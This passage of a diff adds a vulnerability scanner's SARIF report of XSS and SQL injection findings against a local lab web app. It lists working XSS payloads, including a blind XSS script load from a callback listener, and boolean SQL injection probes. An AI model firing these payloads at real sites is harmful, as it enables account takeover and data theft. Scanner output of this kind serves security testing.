+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/spa"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "b5987e5a0ffa388d268ecc734cbfa8e06827e4772d0a378774b6459485aa4be6"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "name",
+            "payload": "<svg/onload=alert('sv1e4e96d00')>sv1e4e96d00",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1e4e96d00",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-12.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/api/xhr [user.name] - executed in chromium: alert:sv1e8381360"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/api/xhr"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "84c910d1a539865623890bbdc94218b80a3c49f5f4edf91426a7cfc40b8c86fa"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "POST",
+            "param": "user.name",
+            "payload": "<svg/onload=alert('sv1e8381360')>sv1e8381360",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1e8381360",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-13.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-attr",
+          "ruleIndex": 7,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/attr [q] - executed in chromium: alert:sv19c5a46ad"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/attr"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "65dd1e606e2fd85bee6db17315974c067844fe7717a4f0d206d69045d6a2069c"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "q",
+            "payload": "sv19c5a46ad'><svg/onload=alert(\"sv19c5a46ad\")>",
+            "technique": "reflected/attr",
+            "evidence": "executed in chromium: alert:sv19c5a46ad",
+            "detail": "execution confirmed in chromium (inside <input> attribute value (single quoted)) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-06.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/blind-oob",
+          "ruleIndex": 5,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/blind-admin [message] - callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 17:52:55, /e image at 17:52:55 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/blind-admin"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "805088341517711eaa08ebf10373eb4885f8634a1f2fdf5220dd3164ae68652d"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "message",
+            "payload": "<script src=\"http://127.0.0.1:8777/t/c4d0863c0afef68c\"></script>",
+            "technique": "blind-oob",
+            "evidence": "callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 17:52:55, /e image at 17:52:55 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)",
+            "detail": "blind xss: payload stored through POST http://127.0.0.1:8099/blind; the callback fired when the page rendered it",
+            "data": {
+              "oob": "executed",
+              "from": "127.0.0.1",
+              "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
+              "fetched": "17:52:55",
+              "time": "17:52:55"
+            },
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/blind-01.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/csrf [message] - executed in chromium: alert:sv1693e848b"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/csrf"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "47e4b45d96627b0f13493a8987a8d847901e89f36bc4d212c02b58ea199c184a"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "POST",
+            "param": "message",
+            "payload": "<svg/onload=alert('sv1693e848b')>sv1693e848b",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1693e848b",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-07.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/dom",
+          "ruleIndex": 6,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/dom [location.hash] - location.hash -> innerHTML: alert:sv1dom07ae084ce"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/dom"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "71e8d57e13b2de5dd3f1101567ee2b823f1b375bc6bfd376881d023a948c58b3"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "location.hash",
+            "payload": "<img src=x onerror=alert('sv1dom07ae084ce')>",
+            "technique": "dom",
+            "evidence": "location.hash -> innerHTML: alert:sv1dom07ae084ce",
+            "detail": "client side sink: decodeURIComponent(location.hash.slice(1));if (raw) { document.getElementById('out').innerHTML = raw; }",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/dom-01.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/dynamic [name] - executed in chromium: alert:sv132160492"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/dynamic"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "9a9e78c7ba380dbe6e518f612c6296b2d3b94289d97ed146afce7f7bc9f41f4a"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "name",
+            "payload": "<svg/onload=alert('sv132160492')>sv132160492",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv132160492",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-15.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/dom",
+          "ruleIndex": 6,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/external [location.hash] - location.hash -> innerHTML: alert:sv1dom086fa534e"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/external"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "bd69b7d0909e5606b20c3f45304a01871c95101790e2d01fa7717a10cd262d06"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "location.hash",
+            "payload": "<img src=x onerror=alert('sv1dom086fa534e')>",
+            "technique": "dom",
+            "evidence": "location.hash -> innerHTML: alert:sv1dom086fa534e",
+            "detail": "client side sink: decodeURIComponent(location.hash.slice(1));if (raw) { document.getElementById('out').innerHTML = raw; } | script: http://127.0.0.1:8099/external.js",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/dom-02.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/feedback [message] - executed in chromium: alert:sv1f2c576fa"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/feedback"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "b16a17f708d22f59dc2f01ca0077403e0ff956f869b86afa25d51b6d2e512896"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "POST",
+            "param": "message",
+            "payload": "<svg/onload=alert('sv1f2c576fa')>sv1f2c576fa",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1f2c576fa",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-03.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/feedback [name] - executed in chromium: alert:sv1be7423b4"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/feedback"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "fcd850c38d929d85bdf76742059a417040acd79237002cfe4eebc1bc1007ab73"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "POST",
+            "param": "name",
+            "payload": "<svg/onload=alert('sv1be7423b4')>sv1be7423b4",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1be7423b4",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-02.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/stored",
+          "ruleIndex": 11,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/guestbook [message] - stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1storeda953951b110"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/guestbook"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "fb481fc46cf5f6b02022cdd867b763634b64d5a423b11b6813f9ff8300d947df"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "message",
+            "payload": "<svg/onload=alert('sv1storeda953951b110')>",
+            "technique": "stored",
+            "evidence": "stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1storeda953951b110",
+            "detail": "the payload was persisted by the application and ran on another page",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/stored-02.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/stored",
+          "ruleIndex": 11,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/guestbook [name] - stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1stored37d74e82100"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/guestbook"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "169a3417168371d279994feb26f63f3102d2140098439112fd2a161a4ee411be"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "name",
+            "payload": "<svg/onload=alert('sv1stored37d74e82100')>",
+            "technique": "stored",
+            "evidence": "stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1stored37d74e82100",
+            "detail": "the payload was persisted by the application and ran on another page",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/stored-01.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-script",
+          "ruleIndex": 8,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/js [q] - executed in chromium: alert:sv10292fc2a"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "dbef2c09b5dbb5c2d058023723be5703b813186d385fa995ca10be334e40ad47"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "q",
+            "payload": "0\";alert('sv10292fc2a')//",
+            "technique": "reflected/script",
+            "evidence": "executed in chromium: alert:sv10292fc2a",
+            "detail": "execution confirmed in chromium (inside a <script> block (double)) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-05.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/search [q] - executed in chromium: alert:sv178bb23c2"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/search"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "21ec4af0b9cd99c29541a47215f7c14f61010b030f3d59ca67485454c91e8f96"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "q",
+            "payload": "<svg/onload=alert('sv178bb23c2')>sv178bb23c2",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv178bb23c2",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-01.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/upload [comment] - executed in chromium: alert:sv1d3b13d45"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/upload"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "c9b59e8811c82a2012bd2eb10a68613b645e803c5c0f0a5bd745eaa37df6963b"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "POST",
+            "param": "comment",
+            "payload": "<svg/onload=alert('sv1d3b13d45')>sv1d3b13d45",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv1d3b13d45",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-08.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflected-text",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/waf [q] - executed in chromium: alert:sv10dbb15a0"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/waf"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "b2fd05fe838c1609ace32cf16bd52de18141298f1024b8c58701585cca1a28ef"
+          },
+          "properties": {
+            "severity": "HIGH",
+            "confidence": "CONFIRMED",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "q",
+            "payload": "<svg/onload=alert('sv10dbb15a0')>sv10dbb15a0",
+            "technique": "reflected/text",
+            "evidence": "executed in chromium: alert:sv10dbb15a0",
+            "detail": "execution confirmed in chromium (in HTML text flow) | proof: alert fired",
+            "data": {},
+            "artifact": "C:\\Users\\mustafa\\AppData\\Local\\Temp\\sv1-lab-final-artifacts/xss-09.png",
+            "security-severity": "8.0"
+          }
+        },
+        {
+          "ruleId": "SV1/SQLI/boolean",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI MEDIUM (MEDIUM) at GET http://127.0.0.1:8099/account [id] - true branch 99.1% like baseline, false branch 94.0% like baseline, branches 6.0% apart (page is volatile, noise 0.9%, confirmed by 2 repeats)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/account"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "0bedf506b7f9cedd1418f00d29e0836386af1595c18c1ffbb771ab9195c78ee6"
+          },
+          "properties": {
+            "severity": "MEDIUM",
+            "confidence": "MEDIUM",
+            "kind": "SQLI",
+            "method": "GET",
+            "param": "id",
+            "payload": "' AND '1'='1  |  ' AND '1'='2",
+            "technique": "boolean",
+            "evidence": "true branch 99.1% like baseline, false branch 94.0% like baseline, branches 6.0% apart (page is volatile, noise 0.9%, confirmed by 2 repeats)",
+            "detail": "boolean based injection: the page changes only on the logical result",
+            "data": {},
+            "artifact": "",
+            "security-severity": "5.5"
+          }
+        },
+        {
+          "ruleId": "SV1/XSS/reflection-encoded",
+          "ruleIndex": 10,
+          "level": "warning",
+          "message": {
+            "text": "XSS MEDIUM (MEDIUM) at GET http://127.0.0.1:8099/safe [q] - <html><body><h1>safe</h1><div>sv1d2e91216</div></body></html>"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "http://127.0.0.1:8099/safe"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "sv1Fingerprint": "c298e756f35f141502ffdd152960f4a697ba8891152af591a61a531e68e8aa6b"
+          },
+          "properties": {
+            "severity": "MEDIUM",
+            "confidence": "MEDIUM",
+            "kind": "XSS",
+            "method": "GET",
+            "param": "q",
+            "payload": "<svg/onload=alert(1)>",
+            "technique": "reflection-encoded",
+            "evidence": "<html><body><h1>safe</h1><div>sv1d2e91216</div></body></html>",
+            "detail": "input reaches the page (in HTML text flow) but markup was encoded or stripped (9 payloads reflected)",
+            "data": {},
+            "artifact": "",
+            "security-severity": "5.5"
+          }
+        }
+      ],
+      "properties": {
+        "target": "http://127.0.0.1:8099/",
+        "tool_author": "ee.zvz",
+        "duration_seconds": 262.79,
+        "requests": 1099,
+        "errorCount": 0,
+        "scanners": [
+          "xss",
+          "sqli"
+        ],
+        "retest": false
+      }
+    }
+  ]
+}
